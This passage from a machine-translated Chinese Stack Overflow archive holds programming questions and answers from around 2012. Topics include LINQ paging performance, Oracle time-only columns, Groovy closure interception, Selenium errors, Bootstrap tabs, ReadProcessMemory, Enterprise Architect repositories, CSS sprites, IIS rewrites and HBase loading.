End If 
```

* * *

顺便说一句，[这里是可用 twitter 库的列表](https://dev.twitter.com/docs/twitter-libraries#dotnet)（但它不是 100% 最新的）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T16:38:47.887

您可以像这样在 LINQ to Twitter 中执行此操作：

```
 Dim credentials As IOAuthCredentials = New InMemoryCredentials
    credentials.ConsumerKey = "xxx"
    credentials.ConsumerSecret = "xxx"
    credentials.OAuthToken = "xxx"
    credentials.AccessToken = "xxx"

    Dim auth As PinAuthorizer = New PinAuthorizer()
    auth.Credentials = credentials

    Dim twitterCtx As TwitterContext = New TwitterContext(auth)
    twitterCtx.UpdateStatus(statusMsg) 
```

如果你想执行查询，你可以这样做：

```
 Dim queryResults = _
        From search In twitterCtx.Search _
        Where search.Type = SearchType.Search _
        And search.Query = "LINQ to Twitter" 
```

更多信息在这里： http: [//linqtotwitter.codeplex.com/](http://linqtotwitter.codeplex.com/)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-09-18T13:37:40.403

一个超级简单的方法是使用[IFTTT](http://ifttt.com)和我的[IFTTT Maker.net 库](http://www.mediafire.com/download/39vn1rx0e5tix2y/ifttt.vb)

首先，在 IFTTT 中创建一个由 Maker 频道触发的新配方，并将事件命名为“tweet_now”。

然后，选择 Twitter 引擎并单击“发布推文”，从输入框中删除所有内容并将其替换为 {{value1}}，然后单击创建食谱。

之后，在 Visual Studio 中，将 ifttt.vb 添加到您的项目中。现在看代码：

```
 Try
    makechannel.scode = "your account ID"
    makechannel.fireevent("tweet_now", "Tweet text", "", "")
   'code goes here if done
    Catch ex As Exception
        'code goes here if it fails
    End Try 
```

然后填写您的帐户 ID。您可以在 ifttt.com/maker 上找到它

就是这样！

# c# - 改进 Linq 查询

> ID：12215279
> 
> 赞同：2
> 
> 时间：2012-08-31T12:21:01.863
> 
> 标签：c#, .net, database, performance, linq-to-entities

我有以下查询：

```
if (idUO > 0)
{
    query = query.Where(b => b.Product.Center.UO.Id == idUO);
}
else if (dependencyId > 0)
{
    query = query.Where(b => b.DependencyId == dependencyId );
}
else
{
    var dependencyIds = dependencies.Select(d => d.Id).ToList();

    query = query.Where(b => dependencyIds.Contains(b.DependencyId.Value));
}

[...] <- Other filters...

if (specialDateId != 0)
{
    query = query.Where(b => b.SpecialDateId == specialDateId);
} 
```

所以，我在这个查询中有其他过滤器，但最后，我在数据库中处理查询：

```
return query.OrderBy(b => b.Date).Skip(20 * page).Take(20).ToList(); // the returned object is a Ticket object, that has 23 properties, 5 of them are relationships (FKs) and i fill 3 of these relationships with lazy loading 
```

当我访问第一个`page`时，它可以，查询不到一个 1 秒，但是当我尝试访问页面 30000 时，查询需要超过 20 秒。linq 查询中有一种方法可以提高查询的性能吗？还是仅在数据库级别？而在数据库层面，对于这种查询，提高性能最好的方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:27:24.440

imo，这里没有太多空间可以让事情变得更好（至少查看提供的代码）。

当您尝试在此类数字上取得良好的性能时，我建议您根本不要使用 `LINQ`，或者在列表中使用它来访问具有较小数据访问权限的东西。

您可以在这里做的是在`DataBase`级别上引入该数据的分页，使用 some ，并从您的代码中`stored procedure`调用它。`C#`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:31:35.413

1- 在数据库中创建一个视图，按日期对项目进行排序，包括所有相关关系，如产品等。

2-创建一个使用相关参数查询此视图的存储过程。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T12:35:38.627

我建议您启动 SQL Server Profiler，并在运行查询（快速和慢速）时在服务器上运行配置文件。完成此操作后，您可以将其拉入数据库引擎优化顾问以获取有关应该添加的索引的一些提示。这在过去对我有很大的影响。当然，如果你知道你需要什么索引，你可以在不运行 Advisor 的情况下添加它们 :)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T14:53:38.203

我想你会发现瓶颈出现在数据库上。这就是为什么；

询问。

你有你的查询和标准。它以非常丑陋但不太糟糕的选择语句进入数据库。

.OrderBy(b => b.Date)

现在您正在按日期订购这个巨大的记录集，这可能不是一个可怕的打击，因为它（希望）在该字段上建立了索引，但这确实意味着整个集合将被放入内存并在任何跳过或采取之前进行排序发生。

.Skip(20 * 页).Take(20)

好的，这就是糟糕的数据库变得粗糙的地方。对于大型记录集，实体在这种事情上非常糟糕。我敢于打开 sql profiler 并查看它发送过来的 sql 的随机混乱。

当您开始跳过和获取时，Entity 通常会发送查询，强制数据库扫描整个巨大的记录集，直到找到您要查找的内容。如果这是记录集中的第一个有序记录，比如第 1 页，它可能不会花费很长时间。当您选择第 30,000 页时，由于 Entity 准备您的声明的方式，它可能正在扫描大量数据。

我强烈建议您查看以下链接。我知道它说的是 2005，但它也适用于 2008。

[http://www.codeguru.com/csharp/.net/net_data/article.php/c19611/Paging-in-SQL-Server-2005.htm](http://www.codeguru.com/csharp/.net/net_data/article.php/c19611/Paging-in-SQL-Server-2005.htm)

阅读该链接后，您可能需要考虑如何创建存储过程来完成您的目标。它将更轻量级，具有缓存的执行计划，并且可以很好地保证为您更快地返回数据。

除此之外，如果您想坚持使用 LINQ，请阅读[Compiled Queries](http://msdn.microsoft.com/en-us/library/bb896297.aspx)并确保将 MergeOption.NoTracking 设置为只读操作。您还应该尝试返回一个带有显式连接的对象查询，而不是一个带有延迟加载的 IQueryable，尤其是在您遍历结果并连接到其他表时。延迟加载可能是真正的性能杀手。

# oracle - oracle仅插入时间

> ID：12215281
> 
> 赞同：3
> 
> 时间：2012-08-31T12:21:03.810
> 
> 标签：oracle, time, to-date

我想将数据作为时间而不是日期插入数据库。如果我使用`to_date('2012-08-31 07:39:33', 'YYYY-MM-DD HH24:MI:SS')`它也会添加日期。如果我使用`to_date('09:34:00', 'HH24:MI:SS')`它，它还会从任何地方添加年、月、日：| 稍后我需要获取时间在 x 和 y 之间的行，而不考虑年、月或日。我怎么做？谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T14:03:54.093

作为`date`Dave 显示的解决方案的替代方案，您可以使用[`interval`](http://docs.oracle.com/cd/E11882_01/server.112/e26088/sql_elements001.htm#sthref167)列的数据类型：

```
create table t42(id number, t interval day to second);

insert into t42 (id, t) values(123, to_dsinterval('0 07:39:33'));
insert into t42 (id, t) values(456, to_dsinterval('0 09:34:00'));

select id
from t42
where t between to_dsinterval('0 07:00:00') and to_dsinterval('0 07:59:59');

    ID
----------
       123 
```

显示间隔有点尴尬，因为它们[没有格式模型](http://docs.oracle.com/cd/E11882_01/server.112/e26088/sql_elements001.htm#BABBICGH)，但如果需要，请参阅[这个问题](https://stackoverflow.com/q/970249/266304)以获得一些想法。如果您仅将它们用于过滤，那么这可能根本不是问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:28:08.727

`DATE`类型始终包含日期组件。

一种选择是继续使用`DATE`并编写代码以忽略日期组件。为了使查询更高效，您可能希望在类似的东西上创建一个基于函数的索引，`TO_CHAR( date_field, 'HH24:MI:SS' )`并在查询中使用该表达式。

或者，您可以使用一个`NUMBER`字段来存储自午夜以来的秒数，并据此编写查询。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T14:36:09.147

您可以使用数字列类型并将值插入为

```
INSERT INTO table_name (nTime) 
   VALUES (date - trunc(date)); 
```

然后选择值

```
select * 
  from table_name t
 where t.nTime between (10 / 24 + 15 / 24 / 60) and (12 / 24 + 30 / 24 / 60) --between 10:15 and 12:30 
```

# binding - 在 groovy 脚本执行中拦截对绑定对象中的闭包的调用

> ID：12215283
> 
> 赞同：1
> 
> 时间：2012-08-31T12:21:05.350
> 
> 标签：binding, groovy, closures, metaclass

我的目标是执行带有绑定的 groovy 脚本，其中函数是预定义的，并且拦截器会注销执行时间和闭包评估的结果。我的示例代码是：

```
 binding.login = { ->
     binding.event.appname=='login'
  }  def gse = new GroovyScriptEngine("src/main/resources/rules")
  gse.run('DSL.groovy', binding) 
```

在我的脚本中，我正在调用登录方法。一切正常，除了我不知道如何使用 MetaClass 拦截它。我的尝试喜欢

```
 Binding.metaClass.invokeMethod = { String name, args ->
                       println ("Call to $name intercepted... ") 
```

不工作。后来我发现闭包是绑定的属性，而不是方法。在这种情况下有什么方法可以执行拦截以及如何执行？元类的正确对象是什么？值得注意的是，我的闭包在另一个嵌套闭包中执行。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T21:23:03.343

我不知道这是否是更好的解决方案，但我设法通过装饰绑定中的闭包来做你想做的事

```
binding = new Binding([
    login : { -> println "binding.login called" },
    echo : { String text -> println "test for $text" },
    foo : { a, b, c -> println "$a $b $c" }
])

binding.variables.each { key, value ->
    if (value instanceof Closure) 
    {
        binding.variables[key] = { Object[] args -> 
            long t0 = System.currentTimeMillis()

            value( *args )

            print "[$key method"
            print " args: $args "
            println " time: ${System.currentTimeMillis() - t0}]"
        }
    }
}

def gse = new GroovyScriptEngine(".")

gse.run('Bind.groovy', binding) 
```

这是我的`Bind.groovy`：

```
println " ** executing bind"
login()
echo("echo")
foo("test", 4, "echo")
println " ** bind script done" 
```

`MissingMethodException`如果您没有将方法定义为绑定中的闭包，您也可以尝试/捕获 a 。

我还向您推荐 Laforge 在创建 DSL 时的幻灯片：

[http://www.slideshare.net/glaforge/going-to-mars-with-groovy-domainspecific-languages](http://www.slideshare.net/glaforge/going-to-mars-with-groovy-domainspecific-languages)

在这个幻灯片中，Laforge 展示了使用扩展脚本的类进行绑定；我认为这是一个很好的方法。更多面向对象。

**更新**

看看 mrhaki 将方法调用委托给基 Script 类的建议（也在 Guillaume 的幻灯片中）：

[http://mrhaki.blogspot.com.br/2011/11/groovy-goodness-create-our-own-script.html](http://mrhaki.blogspot.com.br/2011/11/groovy-goodness-create-our-own-script.html)

我只是用它在 JFugue 上实现了一个 DSL，它马上就可以工作了。

# java - 在列表视图中插入单个视图使 listItem 不可点击

> ID：12215289
> 
> 赞同：0
> 
> 时间：2012-08-31T12:21:25.473
> 
> 标签：java, android

我在 listItemClick 上的列表项内膨胀视图。列表项包含一个复选框。单击复选框时，包含两个/三个编辑文本字段和按钮的线性布局会膨胀到该列表视图（通过光标适配器的 getView 方法完成，动态创建膨胀视图）。

列表视图在项目单击侦听器中注册。布局膨胀后，不会为特定项目调用 onItemClick 侦听器。帮我

我的 getView 代码

```
TextView text1  = (TextView) view.findViewById (R.id.text);
        text1.setText("text");

        CheckBox cb = (CheckBox)view.findViewById(R.id.checkBoxList) ;
        cb.setTag(tag);
        cb.setChecked(false);

        if ( chekedIdVector.contains(cursor.getString(cursor.getColumnIndex(ID) )))
        {
            cb.setChecked(true);
        }

        if( !idVector.isEmpty () )
        {
            LinearLayout ll =(LinearLayout)view.findViewById(R.id.layoutinCell);

            if ( ((String)idVector.lastElement()).equals(cursor.getString(cursor.getColumnIndex(_ID) )) )
            {

                if (ll.getChildCount() == 0 )
                {
                    ll.removeAllViews() ;
                    ll.addView(dynamicallyCreatedView); // view dynamically created with 2/3 textviews and buttons
                }

                ll.setVisibility(View.VISIBLE); 
                view.requestFocus() ;
            }

            else
            {
                ll.removeAllViews() ;
            }
        }

        return view  ; 
```

Ps：我尝试过更改焦点的侦听器并将复选框设置为在xml中不可聚焦

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T12:25:19.987

如果所有其他方法都失败了，请考虑使用 ExpandableListView (http://developer.android.com/reference/android/widget/ExpandableListView.html) 或从一开始就使用 android:visibility="GONE" 填充项目，然后设置它作为“可见”而不是夸大它们。

# selenium - 将目标移出边界异常

> ID：12215295
> 
> 赞同：6
> 
> 时间：2012-08-31T12:21:48.523
> 
> 标签：selenium, webdriver

我正在为 Web 应用程序编写测试，一切顺利，直到我不得不从菜单中选择一个选项，并且该选项在悬停或单击时会显示一个下拉列表。当我从下拉列表中单击一个选项时，我收到以下错误：

`MoveTargetOutOfBoundsException: Element cannot be scrolled into view`

有谁知道这个错误是什么以及我应该在我的代码中寻找什么？

Selenium 版本 2.25.0，java 版本 1.6.0_31

我一直在检查旧版本中有关此问题的一些 selenium 和 google 组 [https://groups.google.com/forum/?fromgroups=#!topic/selenium-users/EuZ7a6_lB9Q](https://groups.google.com/forum/?fromgroups=#!topic/selenium-users/EuZ7a6_lB9Q) [http://code.google.com/ p/selenium/issues/detail?id=3075](http://code.google.com/p/selenium/issues/detail?id=3075) http://code.google.com/p/selenium/issues/detail?id=4102

最近的讨论

这是 Selenium 2.25.0 的一个已知问题还是有办法解决它？我最近升级到 Firefox 15.0 :|

注意：我找到了一个临时解决方案，直到有人神奇地解决了这个问题......因为我找不到问题出在哪里......我在它崩溃之前运行代码，我让它休眠 10 秒，我手动单击下拉列表中的菜单和选项，将显示我想要的窗口，并且代码从该点继续执行操作。它现在有效...我希望这将得到解决，因为我不敢相信我可以在 Selenium IDE 中运行脚本，但我不能在 WebDriver 中运行我的 java 代码...这太疯狂了：|

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T14:59:08.683

我猜您正在尝试从下拉列表中单击一个元素。您应该记住，Selenium 可以帮助您复制精确的人类行为。所以如果代码因为元素不可见而失败，很可能是因为元素不可见。

为了使它工作，您可能希望在失败的代码位之前在菜单上放置一个单击命令。（复制睡眠 10 秒手动单击您正在使用的菜单按钮方法）

再一次，如果您可以向我们展示您的代码以及菜单部分的 HTML 片段，我们可以提供准确的解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-10-31T13:03:46.317

也许您在打开选择框时打开了新的弹出窗口。这可能会帮助您：

```
WebDriver.FindElement(By.Id("someInputBox")).SendKeys("hello");
(IJavaScriptExecutor)WebDriver).ExecuteScript("document.getElementById('windowOpener_Button').click();");
WebDriver.SwitchTo().Window("newDisplayedWindowPopupName"); // continue to test 
```

# ruby-on-rails-3 - Twitter Bootstrap 选项卡：在页面加载时转到特定选项卡

> ID：12215296
> 
> 赞同：2
> 
> 时间：2012-08-31T12:21:49.460
> 
> 标签：ruby-on-rails-3, tabs, twitter-bootstrap, focus

在我的主页上，有一个指向用户显示页面的链接

```
<a id="event_shortcut" href="http://localhost:3000/users/1#event_tab">show events</a> 
```

在用户的节目中，我使用了引导选项卡，

```
<ul id="user_show_tabs">
    <li >
        <a href="#profile_tab">Profile</a>
    </li>
    <li>
        <a href="#event_tab">Events</a>
    </li>
    <li class="active">
        <a href="#account_tab">Account</a>
    </li>
</ul> 
```

当我单击链接时，它应该转到用户的显示页面，并且事件选项卡应该在 foucs 中。所以在js中我确实喜欢这样，

```
$("#event_shortcut").live("click", function(event){
    event.preventDefault(); 
    window.location = $(this).attr("href"); 
    $('#user_show_tabs a[href="#event_tab"]').tab('show');
}); 
```

此 js 代码将用户重定向到显示页面，但未设置事件选项卡焦点。我不知道我错过了什么。帮我！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:34:37.550

当您重定向到另一个页面时，选项卡列表正在刷新。您要么需要输入逻辑以仅`class="active"`在当前页面的选项卡上显示 ，要么您需要使用该`tab-content`方法并将所有页面加载到单独的内容 div 中，因此选项卡实际上不会离开页面更改`<div>`正在显示的内容。

查看 Bootstrap 的 Javascript 部分以获取有关如何执行此操作的更多信息。[http://twitter.github.com/bootstrap/javascript.html#tabs](http://twitter.github.com/bootstrap/javascript.html#tabs)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:52:29.347

在视图中（这是haml）

```
%ul
  li{:class => "#{check_if_active('release')}"
    = link_to "release", part_release_path(@current_organisation, @part) 
```

并在助手中

```
def check_if_active(tab)
  case params[:controller]
  when "parts"
    if ['release'].include?(params[:action])
      tab == "properties" ? "active" : "null"
    end
end 
```

# c - 读取进程内存

> ID：12215299
> 
> 赞同：0
> 
> 时间：2012-08-31T12:21:57.583
> 
> 标签：c, winapi

我正在尝试从进程（calc.exe）中读取内存。但我正在点击“无法读取内存”消息。我的错误在哪里？

```
int main() {
    HWND handle = FindWindow(0, TEXT("Calculadora"));
    if (!handle) {
        msg("Could not find window");
        return 0;
    }

    DWORD id;
    GetWindowThreadProcessId(handle, &id);
    HANDLE proc = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, id);
    if (!proc) {
        msg("Could not open process");
        return 0;
    }

    char buffer[128];
    if (ReadProcessMemory(proc, 0, &buffer, 128, NULL)) {
        msg("yes!!");
    }
    else {
        msg("Could not read memory");
    }

    CloseHandle(proc);
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-31T12:32:38.083

您正在尝试读取目标进程中的地址 0。那总是会失败的。您需要从目标进程的虚拟地址空间中有意义的地址读取。

请注意，为了调用`ReadProcessMemory`您只需要`PROCESS_VM_READ`. 这不是这里的问题，但为了完整起见，我想我会指出它。

# enterprise-architect - DBMS 或 SVN 中的集中存储库

> ID：12215300
> 
> 赞同：4
> 
> 时间：2012-08-31T12:21:59.390
> 
> 标签：enterprise-architect

我正在建立一个集中的存储库来存储企业架构师（来自 sparx 系统）生成的工件，供 6-8 人的团队使用。最初考虑托管一个 PostgreSQL 数据库来集中存储工件，而另一个选择是使用 SVN。查看 EA 文档，并不清楚所考虑的选项的优缺点是什么。与使用 SVN 相比，我在使用 DBMS 时有以下开销。

1.  托管和管理 DBMS
2.  DBMS 的用户配置和管理
3.  工件版本控制需要单独完成
4.  DBMS 的备份等

对于 SVN，从 EA 文档中提到，部署模型仅适用于最大 10 人的团队，并且文件可能会损坏。除了这些之外，使用 SVN 托管存储库还有哪些瓶颈？很高兴听到在多用户环境中与企业架构师合作过的人的建议。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-01T08:05:54.743

“最多 10 人”警告是指您有一个团队共享单个 .EAP 文件的情况。如果所有用户都有自己的 .EAP 文件，或者您设置了 DBMS 存储库，则它不适用。

在 DBMS 设置中，我建议使用 EA 的基线进行版本管理，而不是外部版本控制存储库。这个概念是相似的：单个包是基线化的，但不是将版本存储在外部的 SVN/CVS/etc 中，而是存储在内部的数据库中。

这为您减少了一个需要管理的存储库，但还应该注意的是，EA 在将 DBMS 与外部版本控制相结合时会出现问题，这可能会很烦人，甚至（最坏的情况）会导致信息丢失。外部版本控制旨在与 .EAP 文件一起使用。

与外部版本控制相比，基线有一大优势：您可以在 EA 内部直观地比较不同版本，并查看在各个图表中添加、删除、更改和移动的内容。最大的缺点：基线包在项目浏览器中没有像版本控制包那样用特殊图标指示。

具有单独 .EAP 文件和外部版本控制的部署模型使人们可以选择将不同的包和这些包的不同版本导入到他们的 EA 项目中。对于 DBMS 模型，只有一个 EA 项目，所以每个人总是看到相同包的相同版本。

是的，使用 DBMS，您需要设置用户并实施备份计划。但是您也需要备份 SVN 存储库以及团队成员的个人 .EAP 文件。

DBMS 上 EA 中的用户管理是一个两步过程。每个用户都需要对数据库进行读/写访问，并且每个人还需要在 EA 项目中拥有一个单独的帐户。这些可以通过从 Windows 域导入来轻松创建。

这是假设您在项目中打开了用户安全性，您绝对希望这样做以防止并发编辑问题。

我对团队设置的建议始终是 DBMS + 用户安全 + 基线。它为您提供 EA 工件的单一位置，并且每个人总是看到相同的东西。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-06T12:36:12.857

我同意，我有相同的设置和环境。

我的文档中有来自 i-net 的代码片段。对不起，我还没有来源。但是很高兴在根模型或项目中找到所有基线：

查找 DBMS 中的所有基线 STRG+F 打开模型搜索。选项 --> 管理搜索 --> 创建新搜索 --> 命名“查找所有基线” --> 编辑器类型 SQL-Editor。粘贴这个：

```
SELECT t_package.ea_guid AS CLASSGUID, t_document.ElementType AS CLASSTYPE, t_package.Package_ID as ID, t_package.Name, t_package.Notes as PackageNotes, t_document.Notes as BaselineComments 
FROM t_document INNER JOIN t_package ON t_document.ElementID = t_package.ea_guid 
```

现在你有了一个名为（Find all Baselines）的新搜索，这很舒服！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-01-02T17:37:40.667

目前我正在研究同样的问题，我发现这些很有帮助：

**Enterprise Architect 的部署** [http://www.sparxsystems.com/downloads/whitepapers/EA_Deployment.pdf](http://www.sparxsystems.com/downloads/whitepapers/EA_Deployment.pdf)

**Enterprise Architect 的版本控制最佳实践** [http://www.sparxsystems.com/WhitePapers/Version_Control.pdf](http://www.sparxsystems.com/WhitePapers/Version_Control.pdf)

**[更新]**

在对我们的场景进行了几个月的考虑和测试之后，我们的团队决定了版本控制路线。

每个 Enterprise Architect 项目都需要自己的数据库。这意味着如果您有 5 个项目，则需要 5 个数据库，每个团队一个。将其扩展到 50 个项目或系统，我们有 50 个数据库可供使用、管理等。

我们的方法是：

*   每个项目在版本控制中都有自己的文件夹；
*   用于共享架构模型的可重用资产服务（RAS）；
*   安全性由版本控制团队完成；
*   模型使用导入/导出共享（记得打开图像导出！）

需要改进的地方：

我们希望承包商能够使用“云”访问这些模型，但我们需要首先解决安全问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-06-24T11:46:52.493

DBMS 设置还有一个考虑因素，那就是从远程位置使用存储库时的 EA 性能。EA 没有针对远程连接到其项目数据库（EAP 或 DBMS）进行优化，慢速连接可能会让您在编辑过程中等待很长时间。

# javascript - 使用日期字符串初始化 javascript 日期对象

> ID：12215305
> 
> 赞同：0
> 
> 时间：2012-08-31T12:22:28.660
> 
> 标签：javascript, datetime, simpledateformat

哪些日期字符串被认为是有效的，可以传递给 javascript 日期对象构造函数以初始化日期对象。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T12:25:49.993

[根据MDN](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Date)：

> 该字符串应采用[解析](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Date/parse)方法可识别的格式（符合 IETF 的 RFC 2822 时间戳）。

# html - 带有精灵的可点击图像

> ID：12215310
> 
> 赞同：1
> 
> 时间：2012-08-31T12:22:51.890
> 
> 标签：html, anchor, css-sprites

所以我的页面中有一系列可点击的图像。我试图通过生成包含我需要的所有图像的单个图像来优化这一点，并且我打算使用精灵来选择我想要的。不过，我很难找出将锚标签添加到精灵的最佳方法吗？

所以我想要一个支持精灵的可点击 HTML 元素，最好不使用 JavaScript。我可以使用 JavaScript 做到这一点，但我宁愿避免它。

好的，这是我的代码，有什么：

```
.touringEscorted {
    height:125px;
    width: 214px;
    background-image: url('/Images/Travel2New/ToursImages/ToursBanners.jpg');
    background-position: 0 0;
}

.touringNew {
    height:125px;
    width: 214px;
    background-image: url('/Images/Travel2New/ToursImages/ToursBanners.jpg');
    background-position: -10px 0;
} 
```

我试过了

```
<a href="#"><div class="touringEscorted"></a> 
```

和

```
<a href="#" class="touringEscorted">&nbsp;</a> 
```

和其他几个。似乎没有办法同时使用精灵/背景图像和锚标签。我对吗？有什么建议么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T12:35:02.543

那好吧 ：

```
<a href="#" class="touringEscorted"></a> 
```

应该工作，但添加`display:block;`到 CSS ：

```
.touringEscorted {
    height:125px;
    width: 214px;
    background-image: url('/Images/Travel2New/ToursImages/ToursBanners.jpg');
    background-position: 0 0;
    display:block;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T12:33:05.073

像这样？

```
<a class="sprite sprite1" href="javascript:;">Link Text</a> 
```

* * *

```
sprite {
  display: block;
  background: url(path/to/image/file.ext);
  text-indent: -9999px;
}
sprite1 {
  width: WWpx;
  height: HHpx;
  background-position: -NNpx - MMpx;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-12-19T08:29:44.473

Google 不将屏幕外文本视为垃圾邮件吗？我想出了一个修改。我将链接放在另一个元素中，在本例中是一个表格。我在元素和链接中添加了背景图像类，如下所示：

CSS 代码：

```
.sprite{ 
    background: url('images/sprite.png') no-repeat top left; 
}   
.sprite.termite { 
    background-position: 0px -499px; 
    width: 150px; height: 113px;
    display: block;
} 
```

HTML 代码：

```
<td class="td sprite termite">
    <a href="termite-photos.html" title="termite control" class="sprite termite"></a>
</td> 
```

它完美地渲染了表格中的图像并点击！

# asp.net - IIS 7 中域名的 URL 重写

> ID：12215312
> 
> 赞同：2
> 
> 时间：2012-08-31T12:23:01.140
> 
> 标签：asp.net, iis-7.5, rewrite

我在 IIS 中有两个 asp.net 站点，api.mydomain.com 和 mobileapi.mydomain.com。并且对api的一些请求应该重写为mobileapi。我无法让它工作。从我的实验来看，我似乎无法用 rewrite 重写 url 的域名部分。如果我更改为重定向一切正常（除了我想要重写而不是重定向）

但是，如果我改为重定向到同一域上的某些内容，假设我将操作 url 交换为`/testing/{R:0}`（没有任何域名），那么它会按预期工作并且重写得很好。

我的 web.config

```
<modules runAllManagedModulesForAllRequests="true">
</modules>
<rewrite>
  <rules>
    <rule name="Proxy mobile API" stopProcessing="true">
      <match url=".*" />
      <conditions>
        <add input="{REQUEST_URI}" pattern="([^/]+)" />
        <add input="{StaticRewrites:{C:0}}" pattern="(.+)" />
        <add input="{HTTP_HOST}" pattern="^api.mydomain.se$" />
      </conditions>
      <action type="Rewrite" url="http://mobileapi.mydomain.se/{R:0}" />
    </rule>
  </rules>

  <rewriteMaps>
    <rewriteMap name="StaticRewrites">
      <add key="mobile" value=" " />
      <add key="scripts" value=" " />
    </rewriteMap>
  </rewriteMaps>
</rewrite> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-28T17:01:25.610

根据您设置的项目类型，但如果您使用的是 MVC 4，您可以简单地在 Global.asax.cs 文件中进行此切换。

```
protected void Application_BeginRequest(){
   //mobile device detection and redirection
     if (Request.Browser["IsMobileDevice"] == "true"){
          Response.Redirect("http://mobileapi.mydomain.se");
         }
    } 
```

# hadoop - 使用 HBASE MAP REDUCE API 将数据加载到 Hbase 表中

> ID：12215313
> 
> 赞同：4
> 
> 时间：2012-08-31T12:23:01.557
> 
> 标签：hadoop, mapreduce, hbase

我对 Hbase 和 Map Reduce API 非常陌生。
我对 Map Reduce 概念感到非常困惑。我需要使用 MAPReduce API 将文本文件加载到 Hbase 表中。我搜索了一些示例，但我可以找到 MAPPER () 而不是 reducer 方法。我对何时使用 mapper 以及何时使用 Reducer () 感到困惑。

我的想法是这样的：

1.  要将数据写入 Hbase，我们使用映射器
2.  要从 HBASE 读取数据，我们使用 mapper 和 reducer()。请任何人详细解释我。
3.  我正在尝试将文本文件中的数据加载到 HBASE 表中。我用谷歌搜索并尝试了一些代码，但我不知道如何加载文本文件并在 HBASE mapreduce API 中读取。

我真的很感谢你的帮助

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-11T10:27:10.087

关于您的问题：

*   **Mapper**接收数据拆分并返回一对键 set<values>
*   **Reducer**接收 Mapper 的输出，生成一对 <key, value >

通常，您的*Reducer*任务将写入结果（到文件系统或 HBase），但 Mapper 也可以这样做。有些*MapReduce*作业不需要*Reducer*。关于从 HBase 读取，Mapper 类具有从哪个表读取的配置。但是没有什么关系 Mapper 是阅读器，Reducer 是作者。这篇文章[“HBase MapReduce 示例”提供了有关如何使用](http://hbase.apache.org/book/mapreduce.example.html)*MapReduce*读取和写入 HBase 的很好的示例。

在任何情况下，如果您需要将一些 .csv 文件批量导入 HBase，您实际上并不需要使用*MapReduce*作业。您可以直接使用[HBase API](http://hbase.apache.org/apidocs/org/apache/hadoop/hbase/client/HBaseAdmin.html)来完成。在伪代码中：

```
table = hbase.createTable(tablename, fields); 
foreach (File file: dir) {
   content = readfile(file);    
   hbase.insert(table, content); 
} 
```

我将[.mbox 文件的](https://github.com/dpino/Metamail/tree/master/enron-importer)导入器写入 HBase。看一下代码，它可能会给你一些想法。

将数据导入 HBase 后，您确实需要编写*MapReduce*作业来操作该数据。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-12-02T15:39:01.593

将**HFileOutputFormat**与**CompleteBulkLoad**结合使用是在 HBase 中加载数据的最佳且最快的方法。您将[在此处找到示例代码](http://databuff.blogspot.com/2013/11/bulk-load-data-in-hbase-table.html#.V3-BVut9744)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T15:16:09.253

以下是我的几个回应，它们解决了将数据加载到 HBASE 中的问题。

[以编程方式将数据批量加载到 HBase 的最快方法是什么？](https://stackoverflow.com/questions/8750764/what-is-the-fastest-way-to-bulk-load-data-into-hbase-programmatically/8751176#8751176)

[使用 MultipleOutputs 在 MapReduce 中写入 HBase](https://stackoverflow.com/questions/5983122/writing-to-hbase-in-mapreduce-using-multipleoutputs/5983853#5983853)

编辑：根据评论添加附加链接此链接可能有助于使文件可用于处理。
[在 Hadoop MapReduce 脚本中导入外部库](https://stackoverflow.com/questions/4984894/import-external-libraries-in-an-hadoop-mapreduce-script/5009808#5009808)

# javascript - 1400 个 Raphael.js 对象的动画不透明度会影响动画性能

> ID：12215314
> 
> 赞同：2
> 
> 时间：2012-08-31T12:23:03.527
> 
> 标签：javascript, performance, raphael

首先，感谢您的帮助。:)

[JSFiddle 代码](http://jsfiddle.net/st8ofmindz79/rz4yY/36/)。

[JSFiddle全屏](http://jsfiddle.net/st8ofmindz79/rz4yY/36/embedded/result/)

正如您在上面的小提琴链接中看到的那样，我正在为 1400 个对象设置动画，试图创建“闪烁效果”。随着用户更快地移动鼠标，更多的六边形形状会完全不透明并具有不同的淡出率。小提琴中的版本用足够的颜色填充空间，但感觉生涩和结块。如果我减少 fade_time 变量的数量，它会更平滑，但没有足够的完全不透明的六边形。最终目标是用六边形拼写单词。

Chrome 中的性能最好，FireFox 和 IE 中的性能较差。我在 iPad 上的移动 Safari 中测试（使用 Raphael 的 element.touchmove），结果更糟。

我正在寻找有关哪些代码可以以不同方式完成以提高性能的任何建议。

